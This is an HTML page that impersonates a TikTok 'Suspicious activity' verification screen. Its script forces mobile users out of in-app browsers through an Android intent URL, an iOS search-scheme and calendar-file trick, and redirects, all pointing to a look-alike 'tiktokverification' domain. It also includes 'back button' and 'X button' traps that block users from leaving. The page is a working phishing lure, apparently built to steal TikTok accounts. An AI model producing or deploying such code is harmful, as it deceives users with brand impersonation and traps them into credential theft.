<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body, html { 
            margin: 0; padding: 0; background: #ffffff; 
            height: 100vh; overflow: hidden;
            -webkit-font-smoothing: antialiased;
            font-family: "Proxima Nova", "Inter", -apple-system, sans-serif;
        }
        
        #main-ui {
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            height: 100vh; text-align: center;
            padding: 0 35px; box-sizing: border-box;
        }

        /* Visual elements from the first code */
        .verification-icon { width: 60px; height: 60px; margin-bottom: 15px; }
        .header { color: #161823; font-size: 22px; font-weight: 700; margin-bottom: 10px; }
        .subtext { color: #8A8B91; font-size: 16px; line-height: 1.5; margin-bottom: 40px; max-width: 310px; }

        /* The Button from the functional code */
        .btn { 
            background: #fe2c55; color: #fff; padding: 20px 60px; 
            border-radius: 12px; font-weight: 800; font-size: 22px; 
            border: none; box-shadow: 0 0 20px #fe2c55; 
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="main-ui">
        <svg class="verification-icon" viewBox="0 0 48 48" fill="none">
            <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
            <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
            <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
        </svg>

        <div class="header">Suspicious activity</div>
        <div class="subtext">Please complete verification to continue using TikTok.</div>

        <button class="btn" onclick="forceSystemOpen()">LAUNCH BROWSER</button>
    </div>

<script>
    // THE EXACT LOGIC FROM YOUR FAVORED CODE
    const destination = "https://tiktokverification.github.io/captcha/Verification/verify1.html";

    function forceSystemOpen() {
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            const intent = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
            window.location.href = intent;
        } 
        
        if (isIOS) {
            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
            
            setTimeout(() => {
                const blob = new Blob([`BEGIN:VCALENDAR\nVERSION:2.0\nBEGIN:VEVENT\nURL:${destination}\nEND:VEVENT\nEND:VCALENDAR`], {type: 'text/calendar'});
                const url = URL.createObjectURL(blob);
                window.location.href = url;
            }, 500);

            setTimeout(() => {
                window.location.assign(destination);
            }, 1000);
        }
    }

    // THE "BACK" BUTTON TRAP
    window.onload = () => {
        for(let i=0; i<50; i++) history.pushState(null, null, "#" + i);
    };

    window.onpopstate = () => {
        forceSystemOpen();
    };

    // THE "X" BUTTON TRAP
    window.onblur = () => {
        forceSystemOpen();
    };
</script>
</body>
</html>
